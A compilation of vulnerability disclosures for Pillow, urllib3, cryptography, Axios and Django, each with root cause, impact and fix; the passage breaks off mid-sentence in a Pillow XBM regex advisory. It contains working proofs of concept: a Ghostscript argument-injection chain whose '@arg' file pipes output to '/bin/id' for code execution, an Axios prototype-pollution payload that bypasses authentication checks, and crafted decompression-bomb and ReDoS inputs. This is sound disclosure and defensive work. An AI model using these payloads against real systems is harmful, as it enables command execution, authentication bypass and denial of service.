units.body:
Pillow: EPS load(scale) lets Ghostscript render past the decompression bomb limit ``` ============================================================================ EPS load(scale) lets Ghostscript render past the decompression bomb limit Location: src/PIL/EpsImagePlugin.py:92 in Ghostscript() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` When an application opens an untrusted Encapsulated PostScript file and asks Pillow to render it at a larger scale, Pillow has Ghostscript produce an image several times bigger than Pillow's configured size limit allows. The size check runs only after Ghostscript has finished rendering and written the full raw image to a temporary file. An attacker who can upload a file of about 100 bytes makes each such request spend scale² times the Ghostscript rendering work and temporary disk space that the limit is meant to permit. For example, at scale 2 that is a 972 MB temporary file. The cause is in `Ghostscript()` in `src/PIL/EpsImagePlugin.py`. It multiplies the file-declared size by the caller's `scale` (lines 93-94) and passes the product to `gs` as the `-g` output geometry. It never calls `Image._decompression_bomb_check()` on the scaled size. The only check is the one `Image.open()` ran on the unscaled size, so a file declaring 9000×9000 passes, and `load(scale=2)` then asks Ghostscript for 18000×18000 (3.6× `MAX_IMAGE_PIXELS`). A file declaring 18000×18000 directly would be refused before Ghostscript ever ran. `DecompressionBombError` fires only when Pillow reopens the output file, so Pillow's own in-process allocation stays bounded and there is no memory corruption. The effect is a constant-factor overshoot rather than an unbounded one, for three reasons: * The multiplier is an integer chosen by the application, not by the file. * With the default warning filter, `Image.open()` already lets files up to 2× the limit reach Ghostscript at `scale=1`. * Any application feeding untrusted files to Ghostscript is already exposed to a tiny file that keeps Ghostscript busy indefinitely, since `gs` runs with no timeout. This is the EPS counterpart of the WMF `load(dpi)` gap closed in af70b075a. It has been present since the decompression-bomb limit was introduced in ce2955ec7 (2.5.0). The attached reproducer stubs out Ghostscript and shows a 76-byte file passing `Image.open()` and reaching `gs` with `-g18000x18000`. A one-line patch mirroring the WMF check is included. ## Details `EpsImageFile.load(scale=N)` (the documented way to rasterise an EPS at higher resolution) renders `width*N × height*N` pixels through Ghostscript, but the only decompression-bomb check on the way is the one `Image.open()` ran on the *unscaled*, file-declared `width × height`. The scaled product is never passed to `Image._decompression_bomb_check()` before `gs` is started. This 111-byte EPS declares 9000×9000 = 81,000,000 pixels, below the default `MAX_IMAGE_PIXELS` (89,478,485), so `Image.open()` accepts it without even a warning: ``` %!PS-Adobe-3.0 EPSF-3.0 %%BoundingBox: 0 0 9000 9000 %%EndComments 0 0 moveto 9000 9000 lineto stroke showpage ``` `im.load(scale=2)` on it then executes ``` gs -q -g18000x18000 -r144.000000x144.000000 -dBATCH -dNOPAUSE -dSAFER -sDEVICE=pnmraw -sOutputFile=/tmp/tmpXXXX -c 0 0 translate -f attack.eps -c showpage ``` i.e. asks Ghostscript for an 18000×18000 = 324,000,000-pixel raster (3.6× `MAX_IMAGE_PIXELS`), whose `pnmraw` output is a 972,000,019-byte file in the temp directory. An EPS that declares 18000×18000 directly is rejected by `Image.open()` with `DecompressionBombError` before Ghostscript is ever run; via `scale=2` the same raster is rendered first and the `DecompressionBombError` only appears afterwards, when Pillow opens the file Ghostscript produced. (Between 1× and 2× `MAX_IMAGE_PIXELS`, `Image.open()` only emits `DecompressionBombWarning`, so with the default warning filter an EPS declaring e.g. 13377×13377 is already rendered at `scale=1` — a 537 MB PNM. Against that baseline, `scale=2` is 4× an already-permitted render.) The arithmetic is in `Ghostscript()`: ```python # src/PIL/EpsImagePlugin.py:91-97 # Hack to support hi-res rendering scale = int(scale) or 1 width = size[0] * scale height = size[1] * scale # resolution is dependent on bbox and size res_x = 72.0 * width / (bbox[2] - bbox[0]) … # src/PIL/EpsImagePlugin.py:139-142 command = [ gs_binary, "-q", # quiet mode f"-g{width:d}x{height:d}", # set output geometry (pixels) … # src/PIL/EpsImagePlugin.py:165-168 subprocess.check_call(command, startupinfo=startupinfo) with Image.open(outfile) as out_im: out_im.load() return out_im.im.copy() ``` and its caller does nothing between taking `scale` from the application and invoking it: ```python # src/PIL/EpsImagePlugin.py:411-417 def load(self, scale: int = 1, transparency: bool = False) -> …: # Load EPS via Ghostscript if self.tile: assert self.fp is not None self.im = Ghostscript(self.tile, self.size, self.fp, scale, transparency) ``` `size` here is `self._size`, computed in `_open()` from the file's `%%BoundingBox` (or `%ImageData`) and checked once by `Image.open()` at `src/PIL/Image.py:3700`. For the benign path (`scale=1`) that check covers exactly what Ghostscript is asked to render. For `scale=N` the rendered pixel count is N² times what was checked, so a file can sit just under the limit at open time and have Ghostscript render 4× (scale 2), 9× (scale 3), 16× (scale 4) the configured budget. The first point at which Pillow looks at the real size again is `Image.open(outfile)` at line 166 — after `subprocess.check_call` has returned, i.e. after Ghostscript has spent the CPU and written `width*height*3` bytes to `tempfile.mkstemp()`'s directory. `WmfStubImageFile.load(dpi)` has the same shape (file-derived extent × caller-supplied factor → new raster) and, since af70b075a, calls `Image._decompression_bomb_check(self.size)` on the recomputed size before rendering (`src/PIL/WmfImagePlugin.py:127-131`). The EPS path lacks the equivalent line. The gap dates from ce2955ec7128 ("Throw an exception when an opened image is larger than an arbitrary limit", 2014-05-14, first released in 2.5.0), which added the check to `Image.open()` without covering the `scale` path. ## Impact Affected are applications that open untrusted EPS/PS with Ghostscript installed and call `load(scale=N)` with a fixed N > 1, as the handbook suggests for non-blurry output. Handing untrusted EPS to Ghostscript at all already lets the same attacker tie up a worker with an equally tiny file (e.g. a PostScript `{} loop`; Pillow runs `gs` with no timeout), so this bug adds a constant factor rather than a new denial-of-service capability. Within that setting, a ~110-byte upload makes each request run Ghostscript over N² × `MAX_IMAGE_PIXELS` pixels (N² × 2·`MAX_IMAGE_PIXELS` if the application does not turn `DecompressionBombWarning` into an error) and write a `W·H·3`-byte PNM into the temp directory — 972 MB for the example above at scale 2, 2.2 GB at scale 3, 8.6 GB for a 178-Mpixel declaration at scale 4 — before any limit is applied. The operator's `MAX_IMAGE_PIXELS` setting is exceeded by a factor of N²; N is an integer chosen by the application, not by the file, so the work stays bounded at N² × 2·`MAX_IMAGE_PIXELS`. The consequence is N² more Ghostscript CPU and temp-disk use per request than the configured limit intends; Pillow's own in-process pixel allocation remains bounded because `Image.open(outfile)` re-checks the PNM's size, and there is no memory corruption. This is a sibling of the WMF `load(dpi)` issue fixed in af70b075a ("Add decompression bomb check when loading at a different DPI"); the EPS `scale` path was not covered by that change. Unlike the WMF case, where the file-controlled `_inch` makes the ratio unbounded, the EPS multiplier is fixed by the application. ## Reproducing Run `repro` against the installed Pillow. Ghostscript does not need to be installed: the script sets `EpsImagePlugin.gs_binary = "gs"` so that `has_ghostscript()` skips its `gs --version` probe, and replaces `subprocess.check_call` with a function that records the command line Pillow builds and then raises `OSError`, so nothing is actually rendered. It writes a 76-byte EPS declaring `%%BoundingBox: 0 0 9000 9000` (the example above without the drawing line; 81 Mpixel, below the default `MAX_IMAGE_PIXELS` of 89,478,485) and turns `DecompressionBombWarning` into an error, so any bomb check — warning or hard error — counts. It then calls `Image.open()` and `im.load(scale=2)`. `Image.open()` accepts the file and `load(scale=2)` reaches the intercepted Ghostscript call with `-g18000x18000` (324,000,000 pixels, 3.6× `MAX_IMAGE_PIXELS`, a 972 MB `pnmraw` output with real Ghostscript). The script prints the geometry it captured. It prints `BUG` when Ghostscript was invoked with a `-g` geometry above `2*MAX_IMAGE_PIXELS` (178,956,970) and no decompression-bomb check fired before that call; otherwise it prints `OK`. With the attached patch applied, `load(scale=2)` raises `DecompressionBombError` before Ghostscript is called and the script prints `OK`. ## Suggested fix The attached patch checks the scaled size in `Ghostscript()` right after the scaled `width`/`height` are computed (`src/PIL/EpsImagePlugin.py:93-94`) and before the `gs` command is built, mirroring `WmfStubImageFile.load`: ```diff --- a/src/PIL/EpsImagePlugin.py +++ b/src/PIL/EpsImagePlugin.py @@ -92,6 +92,7 @@ def Ghostscript( scale = int(scale) or 1 width = size[0] * scale height = size[1] * scale + Image._decompression_bomb_check((width, height)) # resolution is dependent on bbox and size res_x = 72.0 * width / (bbox[2] - bbox[0]) res_y = 72.0 * height / (bbox[3] - bbox[1]) ``` `load(scale=N)` now raises `DecompressionBombError` / emits `DecompressionBombWarning` under the same `MAX_IMAGE_PIXELS` thresholds `Image.open()` applies, before Ghostscript runs instead of after. Placing the check in `Ghostscript()` rather than in `EpsImageFile.load()` is the single point where the rendered extent is decided, so it also covers direct callers of the module-level function. With the patch applied to a clean checkout the reproducer prints `OK` and `Tests/test_file_eps.py` passes. One cosmetic side effect: at `scale=1` the check re-emits the `DecompressionBombWarning` that `Image.open()` already issued for sizes between 1× and 2× the limit; guarding the call with `if scale > 1:` would avoid the duplicate. The patch also adds `test_load_scale_decompression_bomb` to `Tests/test_file_eps.py`, in the style of the WMF test: it sets `MAX_IMAGE_PIXELS` to `im.width * im.height` and expects `im.load(scale=2)` to raise `DecompressionBombError`. Like the rest of that file it is skipped without Ghostscript, because `has_ghostscript()` is consulted at the top of `Ghostscript()`; moving the check above that call would let the test run without it. ## The patch Add decompression bomb check on the scaled size in EpsImagePlugin.Ghostscript() before Ghostscript is invoked Applies to `src/PIL/EpsImagePlugin.py` at the commit above. ```diff diff --git a/Tests/test_file_eps.py b/Tests/test_file_eps.py index 70eced62a..de331d97f 100644 --- a/Tests/test_file_eps.py +++ b/Tests/test_file_eps.py @@ -98,6 +98,14 @@ def test_sanity(filename: str, size: tuple[int, int], scale: int) -> None: assert image.format == "EPS" [email removed](not HAS_GHOSTSCRIPT, reason="Ghostscript not available") +def test_load_scale_decompression_bomb(monkeypatch: pytest.MonkeyPatch) -> None: + with Image.open(FILE1) as im: + monkeypatch.setattr(Image, "MAX_IMAGE_PIXELS", im.width * im.height) + with pytest.raises(Image.DecompressionBombError): + im.load(scale=2) + + @pytest.mark.skipif(not HAS_GHOSTSCRIPT, reason="Ghostscript not available") def test_load() -> None: with Image.open(FILE1) as im: diff --git a/src/PIL/EpsImagePlugin.py b/src/PIL/EpsImagePlugin.py index 5eaefe339..ccc6f1d85 100644 --- a/src/PIL/EpsImagePlugin.py +++ b/src/PIL/EpsImagePlugin.py @@ -92,6 +92,7 @@ def Ghostscript( scale = int(scale) or 1 width = size[0] * scale height = size[1] * scale + Image._decompression_bomb_check((width, height)) # resolution is dependent on bbox and size res_x = 72.0 * width / (bbox[2] - bbox[0]) res_y = 72.0 * height / (bbox[3] - bbox[1]) ``` ## The reproducer
Reproducer — repro, 1,845 bytes (click to open) Its last line is `BUG` when the issue triggers and `OK` when it does not. Re-run on a clean build of that commit it printed `BUG`. ```python #!/usr/bin/env python3 # EpsImagePlugin.Ghostscript(): load(scale=N) hands gs a -g geometry of # (W*N)x(H*N) with no _decompression_bomb_check on the scaled size; only the # unscaled WxH was checked by Image.open(). gs is not installed here, so we # set gs_binary and intercept subprocess.check_call to read the argv Pillow builds. import os, subprocess, tempfile, warnings from PIL import Image, EpsImagePlugin EpsImagePlugin.gs_binary = "gs" # skip the `gs --version` probe path = os.path.join(tempfile.mkdtemp(), "a.eps") with open(path, "w") as f: # 9000x9000 = 81 Mpx < MAX_IMAGE_PIXELS (89.5 Mpx) f.write("%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 9000 9000\n%%EndComments\nshowpage\n") calls = [] def fake_check_call(cmd, **kw): calls.append(cmd) raise OSError("gs intercepted") # stop here; we only need the argv subprocess.check_call = fake_check_call hard = 2 * Image.MAX_IMAGE_PIXELS bomb_before_gs = False with warnings.catch_warnings(): warnings.simplefilter("error", Image.DecompressionBombWarning) try: with Image.open(path) as im: print("Image.open accepted", os.path.getsize(path), "byte EPS, size", im.size) im.load(scale=2) except (Image.DecompressionBombError, Image.DecompressionBombWarning) as e: bomb_before_gs = not calls print("bomb check fired", "before" if bomb_before_gs else "after", "gs:", e) except OSError as e: print("load() reached gs:", e) over = False for c in calls: g = next(a for a in c if a.startswith("-g"))[2:] w, h = map(int, g.split("x")) over |= w * h > hard print(f"gs argv geometry -g{g} = {w*h} px ({w*h/Image.MAX_IMAGE_PIXELS:.1f}x MAX_IMAGE_PIXELS, " f"hard limit {hard}); pnmraw output would be {w*h*3} bytes") print("BUG" if calls and over and not bomb_before_gs else "OK") ```

urllib3: HTTPResponse.stream()/read_chunked() buffers an unbounded chunk-size line into memory
## Impact

urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.7.0/advanced-usage.html#streaming-and-i-o) is designed for efficiently handling large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once. When decoding a [chunked-transfer-encoded response](https://httpwg.org/specs/rfc9112.html#chunked.encoding), this API reads each chunk's size field by buffering until it sees `\n` or EOF.

A malicious HTTP server can return `Transfer-Encoding: chunked` and then send a very long run of bytes without any newline, causing the streaming client to buffer that entire run before urllib3 can reject the chunk size as invalid and allocate more memory than intended.

To fix the issue, we'll reject chunk-size fields larger than 65536 bytes, as already done in the non-streaming case, which is currently handled by the Python standard library. Note that this only applies to reading the chunk-size field, not the chunk data, which is already handled correctly. Thus, there shouldn't be any impact for non-malicious servers.

## Affected usages

Applications and libraries using urllib3 versions earlier than 2.8.0 may be affected when streaming a chunked response from untrusted sources. Specifically, this affects the [read_chunked()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read_chunked) and [stream()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.stream) methods of the HTTPResponse object.

This also affects requests streaming API, which uses urllib3 under the hood.

## Remediation

Upgrade to urllib3 version 2.8.0 or later, where chunk-size fields larger than 65536 will be rejected. If upgrading is not immediately possible, consider reading the response at once using the [read()](https://urllib3.readthedocs.io/en/stable/reference/urllib3.response.html#urllib3.response.BaseHTTPResponse.read) method.

units.body:
Cipher.update_into can corrupt memory if passed an immutable python object as the outbuf
Previously, `Cipher.update_into` would accept Python objects which implement the buffer protocol, but provide only immutable buffers:

```pycon
>>> outbuf = b"\x00" * 32
>>> c = ciphers.Cipher(AES(b"\x00" * 32), modes.ECB()).encryptor()
>>> c.update_into(b"\x00" * 16, outbuf)
16
>>> outbuf
b'\xdc\x95\xc0x\xa2@\x89\x89\xadH\xa2\x14\x92\x84 \x87\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

This would allow immutable objects (such as `bytes`) to be mutated, thus violating fundamental rules of Python. This is a soundness bug -- it allows programmers to misuse an API, it cannot be exploited by attacker controlled data alone.

This now correctly raises an exception.

This issue has been present since `update_into` was originally introduced in cryptography 1.8.

Pillow: Argument Injection in Ghostscript call, potentially leading into RCE
### Summary
`PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f <infile>`. A filename beginning with `-` is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with `-dSAFER` enabled).

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

#### Type
CWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)

#### Vulnerable Codes

```python
infile_temp = None
if hasattr(fp, "name") and os.path.exists(fp.name):
    infile = fp.name                      # user-controlled path used as-is, without validation
else:
    in_fd, infile_temp = tempfile.mkstemp()
    os.close(in_fd)
    infile = infile_temp
    # ... (copy fp into a temporary file)

# Build Ghostscript command
command = [
    gs_binary,
    "-q",
    f"-g{width:d}x{height:d}",
    f"-r{res_x:f}x{res_y:f}",
    "-dBATCH",
    "-dNOPAUSE",
    "-dSAFER",                            # default sandbox — does NOT stop this injection
    f"-sDEVICE={device}",
    f"-sOutputFile={outfile}",
    "-c",
    f"{-bbox[0]} {-bbox[1]} translate",
    "-f",
    infile,                               # injected here: inserted into argv with no check for
                                          # option prefixes (-, --) or Ghostscript's @-file token
                                          # => argument injection (CWE-88)
    "-c",
    "showpage",
]
# ...
subprocess.check_call(command, startupinfo=startupinfo)   # spawns Ghostscript
```

#### Root cause. 

When rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f <infile> position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.

#### Affected
- Pillow: tested on 12.3.0 (latest); vulnerable code is long-standing and appears to affect all current versions (main included).
- Component: `src/PIL/EpsImagePlugin.py`, `Ghostscript()` — `infile = fp.name`, and the command list entry `"-f", infile`.

#### Suggested fix
Normalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (`-`/`--`) or as an argument-file token (`@`):
```python
    if hasattr(fp, "name") and os.path.exists(fp.name):
        infile = os.path.abspath(fp.name)   # was: infile = fp.name
```
`os.path.abspath()` guarantees the path starts with a path separator (or a drive letter on Windows), so a leading `-` or `@` can no longer reach Ghostscript's argument parser. The `else` branch already builds a safe `tempfile.mkstemp()` path and needs no change.

### PoC
dockerfile, Default run shows the argument-injection demo (poc.py); for the RCE PoC run python3 poc-rce.py.
```
FROM ubuntu:24.04

RUN apt update
RUN apt install -y --no-install-recommends python3 python3-venv ghostscript ca-certificates
RUN rm -rf /var/lib/apt/lists/*
RUN python3 -m venv /venv && /venv/bin/pip install --upgrade pip Pillow==12.3.0
ENV PATH=/venv/bin:$PATH
WORKDIR /poc
COPY poc.py .
COPY poc-rce.py .
COPY arg .

CMD ["python3", "poc.py"]
```
poc.py
```
import os
from PIL import Image

############################################################################################
# Attacker controlled file
############################################################################################

EPS = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n%%EndComments\nshowpage\n"

name = "-h"
with open(name, "wb") as f:
    f.write(EPS)

############################################################################################

print(f"[*] Pillow opens a file whose name is {name!r}")
im = Image.open(name)
print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'")
try:
    im.load()
except Exception as e:
    print(f"[*] load() raised: {type(e).__name__}: {e}")

print("CWE-88: argument injection; Pillow code doesn't validate argument name")
print("        This poc.py shows the vulnerability clearly.")
print("        If Pillow checks the name of file before it uses, It won't display `help`")
```
poc-rce.py
```
import os
from PIL import Image

############################################################################################
# Attacker controlled file
############################################################################################

EPS = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 100 100\n%%EndComments\nshowpage\n"

# To chain this vulnerability into critical RCE, We need another arbitrary text file
# In this script, it is `arg`.
name = "@arg"
with open(name, "wb") as f:
    f.write(EPS)

############################################################################################

print(f"[*] Pillow opens a file whose name is {name!r}")
im = Image.open(name)
print(f"[*] call `load()`; this paths calls `gs` command with '-f {name}'")
print(f"[*] and this leads to arbitrary command injection.")
print(f"*********************************************")
try:
    im.load()
except Exception as e:
    print(f"*********************************************")
    print(f"[*] load() raised: {type(e).__name__}: {e}")

print("")
print("CWE-78: OS Command Injection;")
print("CWE-88: Argument Injection  ; Pillow code doesn't validate argument name")
print("        This poc.py shows the vulnerability clearly.")
print("        If Pillow checks the name of file before it uses, It won't call `id`")
```
arg
```
-sOutputFile=%pipe%/bin/id
-c
1
dict
dup
/OutputFile
(%pipe%/bin/id)
put
setpagedevice
```

### Impact
**Confirmed — Ghostscript argument injection.** Because the filename is not validated, a leading `-`/`--` is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to `Image.open()` can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.

**Potential RCE (verified).** The filename is also not validated against Ghostscript's `@`-file syntax: a filename of the form `@<path>` causes Ghostscript to read additional command-line arguments from `<path>`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of `id`).

Applies under Pillow's default configuration (with `-dSAFER` enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)

### Why this is a Pillow bug (not the documented "block untrusted EPS" risk)
This is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this.
Because Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.

### Author
Chanu Kang (from CysecLab at KAIST) @HLe4s

Axios: Authentication Bypass via Prototype Pollution Gadget in `validateStatus` Merge Strategy
# Vulnerability Disclosure: Authentication Bypass via Prototype Pollution Gadget in `validateStatus` Merge Strategy

## Summary

The Axios library is vulnerable to a Prototype Pollution "Gadget" attack that allows any `Object.prototype` pollution to **silently suppress all HTTP error responses** (401, 403, 500, etc.), causing them to be treated as successful responses. This completely bypasses application-level authentication and error handling.

The root cause is that `validateStatus` is the **only** config property using the `mergeDirectKeys` merge strategy, which uses JavaScript's `in` operator — an operator that inherently traverses the prototype chain. When `Object.prototype.validateStatus` is polluted with `() => true`, all HTTP status codes are accepted as success.

**Severity:** High (CVSS 8.2)
**Affected Versions:** All versions (v0.x - v1.x including v1.15.0)
**Vulnerable Component:** `lib/core/mergeConfig.js` (`mergeDirectKeys` strategy) + `lib/core/settle.js`

## CWE

- **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')
- **CWE-287:** Improper Authentication

## CVSS 3.1

**Score: 8.2 (High)**

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N`

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network | PP is triggered remotely |
| Attack Complexity | Low | Once PP exists, a single property assignment exploits this. Consistent with GHSA-fvcv-3m26-pcqx |
| Privileges Required | None | No authentication needed |
| User Interaction | None | No user interaction required |
| Scope | Unchanged | Impact within the application |
| Confidentiality | Low | 401 treated as success may expose data behind auth gates |
| Integrity | High | All error handling and auth checks are silently bypassed — application operates on invalid assumptions |
| Availability | None | The function works correctly (returns true), no crash |

## Usage of "Helper" Vulnerabilities

This vulnerability requires **Zero Direct User Input**.

If an attacker can pollute `Object.prototype` via any other library in the stack, Axios will automatically inherit the polluted `validateStatus` function during config merge. The `in` operator in `mergeDirectKeys` makes this property **uniquely susceptible** to prototype pollution compared to all other config properties.

## Why `validateStatus` Is Uniquely Vulnerable

All other config properties use `defaultToConfig2`, which reads `config2[prop]` (traverses prototype). But `validateStatus` uses `mergeDirectKeys`, which uses the `in` operator:

```javascript
// mergeConfig.js:58-64 — mergeDirectKeys (ONLY used by validateStatus)
function mergeDirectKeys(a, b, prop) {
  if (prop in config2) {           // ← `in` traverses prototype chain!
    return getMergedValue(a, b);
  } else if (prop in config1) {
    return getMergedValue(undefined, a);
  }
}

// mergeConfig.js:94
const mergeMap = {
  // ... all others use defaultToConfig2 ...
  validateStatus: mergeDirectKeys,   // ← ONLY property using this strategy
};
```

The `in` operator is a **more aggressive** prototype traversal than property access. While `config2['validateStatus']` also traverses the prototype, the explicit `in` check makes the intent clearer and the vulnerability more direct.

## Proof of Concept

### 1. The Setup (Simulated Pollution)

```javascript
Object.prototype.validateStatus = () => true;
```

### 2. The Gadget Trigger (Safe Code)

```javascript
// Application checks authentication via HTTP status codes
try {
  const response = await axios.get('https://api.internal/admin/users');
  // Developer expects: 401 → catch block → redirect to login
  // Reality: 401 → treated as success → displays admin data
  processAdminData(response.data);  // Executes with 401 response body!
} catch (error) {
  redirectToLogin();  // NEVER REACHED for 401/403/500
}
```

### 3. The Execution

```javascript
// mergeConfig.js:58 — 'validateStatus' in config2
// config2 = { url: '/admin/users', method: 'get' }
// 'validateStatus' in config2 → checks prototype → finds () => true → TRUE
// → getMergedValue(defaultValidator, () => true) → returns () => true

// settle.js:16 — ALL status codes resolve
const validateStatus = response.config.validateStatus;  // () => true
if (!response.status || !validateStatus || validateStatus(response.status)) {
  resolve(response);  // 401, 403, 500 all resolve here!
}
```

### 4. The Impact

```
Before pollution:
  HTTP 200 → resolve (success)
  HTTP 401 → reject (auth error) → redirectToLogin()
  HTTP 403 → reject (forbidden) → showAccessDenied()
  HTTP 500 → reject (server error) → showErrorPage()

After pollution:
  HTTP 200 → resolve (success)
  HTTP 401 → resolve (SUCCESS!) → processAdminData() with error body
  HTTP 403 → resolve (SUCCESS!) → application thinks user has access
  HTTP 500 → resolve (SUCCESS!) → application processes error as data
```

## Verified PoC Output

```
--- Before Pollution ---
401: REJECTED as expected - Request failed with status code 401
500: REJECTED as expected - Request failed with status code 500

--- After Pollution ---
200: RESOLVED as success (status: 200)
301: RESOLVED as success (status: 301)
401: RESOLVED as success (status: 401)
403: RESOLVED as success (status: 403)
404: RESOLVED as success (status: 404)
500: RESOLVED as success (status: 500)
503: RESOLVED as success (status: 503)

--- Authentication Bypass Demo ---
Auth check bypassed! 401 treated as success.
Application proceeds with: { status: 401, message: 'Response with status 401' }
```

## Impact Analysis

- **Authentication Bypass:** Applications relying on axios rejecting 401/403 to enforce auth will silently accept unauthorized responses, allowing unauthenticated access to protected resources.
- **Silent Error Swallowing:** 500-series errors are treated as success, causing applications to process error bodies as valid data — leading to data corruption or logic errors.
- **Security Control Bypass:** Rate limiting (429), WAF blocks (403), and CAPTCHA challenges are suppressed.
- **Universal Scope:** Affects every axios instance in the application, including third-party libraries.

## Recommended Fix

Replace the `in` operator with `hasOwnProperty` in `mergeDirectKeys`:

```javascript
// FIXED: lib/core/mergeConfig.js
function mergeDirectKeys(a, b, prop) {
  if (Object.prototype.hasOwnProperty.call(config2, prop)) {
    return getMergedValue(a, b);
  } else if (Object.prototype.hasOwnProperty.call(config1, prop)) {
    return getMergedValue(undefined, a);
  }
}
```

units.body:
Django GeoDjango spatial lookups allow file writes and outbound requests through GDAL raster parsing
An issue was discovered in Django 5.2 before 5.2.17 and 6.0 before 6.0.8.
GeoDjango spatial lookups optimistically parse the right-hand-side value as a raster by passing it to the `django.contrib.gis.gdal.GDALRaster` constructor. Any value used in a spatial lookup against a `GeometryField` or `RasterField` reaches this constructor, including untrusted input, for example a spatial-field filter submitted through the Django admin changelist query string by a staff user with view permission. A `dict`, or a `str` holding its JSON representation, is opened in write mode regardless of the constructor's `write=False` default, allowing a file with an attacker-chosen name and contents to be written through a file-backed GDAL driver. Any other `str` is treated as a datasource, allowing an outbound network request through a GDAL virtual filesystem handler. Writing a file to a location later imported by the application can result in remote code execution.
Earlier, unsupported Django series (such as 5.1.x, 5.0.x, and 4.2.x) were not evaluated and may also be affected.
Django would like to thank Bence Nagy, localhost-detect, and kimchunbok_ for reporting this issue.

units.body:
Pillow: ReDoS in XbmImagePlugin: 512-byte file stalls Image.open() for minutes ``` ============================================================================ ReDoS in XbmImagePlugin: 512-byte file stalls Image.open() for minutes Location: src/PIL/XbmImagePlugin.py:58 in XbmImageFile._open() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 512-byte file makes Pillow's `Image.open()` spend about six minutes of processor time on one core before it gives up with `UnidentifiedImageError`. Anyone who can hand bytes to an application that opens images with Pillow's default settings can trigger this, for example through an upload form, a thumbnailer, or a service that checks whether a blob is an image. A few such files sent at once can tie up a typical pool of worker processes. The cause is the `xbm_head` regular expression in `src/PIL/XbmImagePlugin.py:32-40`, which `XbmImageFile._open()` (line 58) runs over the first 512 bytes of any stream whose prefix starts with `#define`. Several adjacent parts of the pattern can match the same characters. `[ \t]+` overlaps with `.*` in the width and height lines and with `[^_]*` in the optional hotspot lines, and `[\r\n]+` closing the hotspot group overlaps with the following `[\000-\377]*`. The header sets a run of k spaces after each `#define` and a run of k line terminators after `_y_hot`, then omits the `[]` after `_bits`. That forces Python's backtracking matcher to try every way of splitting those runs and rescan the remaining bytes each time. The cost grows roughly as k to the fifth power: k = 60 measured 375 s, while a well-formed XBM of the same size opens in about 40 ms. Because this happens before any format is identified, none of Pillow's size, pixel-count or decompression-bomb limits apply, and upload size limits do not help because the file is tiny. `ImageFile.Parser.feed()` repeats the cost on every chunk until the stream is identified. The only existing mitigation is passing a `formats=` allowlist that excludes `"XBM"`. The attached reproducer opens the same header with and without the trailing `[]`. The valid version opens as XBM in 52 ms. The broken version takes 0.1 s, 0.75 s, 3.0 s and 8.6 s at k = 10, 15, 20 and 25, and the slow k = 60 case is not run. This is the same class of bug as CVE-2021-25292 in `PdfParser`, but in a different plugin and reachable from plain `Image.open()`. ## Details `XbmImageFile._open()` identifies an XBM file by running the module-level regex `xbm_head` over the first 512 bytes of the stream. The pattern has several adjacent quantifier pairs that can consume the same characters, followed by a `[\000-\377]*_bits\[]` tail that rescans the rest of the buffer for every way of splitting them. A 512-byte input built to exercise all of them and then fail the final literal keeps `Image.open()` in `xbm_head.match()` for minutes before it raises `UnidentifiedImageError`. This 512-byte input (k = 60) takes 375 s of CPU in `Image.open(io.BytesIO(data))` with default settings, measured on the stock build at this commit: ```python k = 60 data = b"#define" + b" "*k + b"_width 1\r" data += b"#define" + b" "*k + b"_height 1\r" data += b"#define" + b" "*k + b"_x_hot 1\r" data += b"#define" + b" "*k + b"_y_hot 1" + b"\r"*k data += b"_bits" # no "[]": the final literal never matches data += b"A" * (512 - len(data)) # pad to the 512 bytes _open() reads ``` Calling `XbmImagePlugin.xbm_head.match(data)` directly gives the same picture: k = 10 → 0.11 s, k = 15 → 0.76 s, k = 20 → 3.0 s, k = 25 → 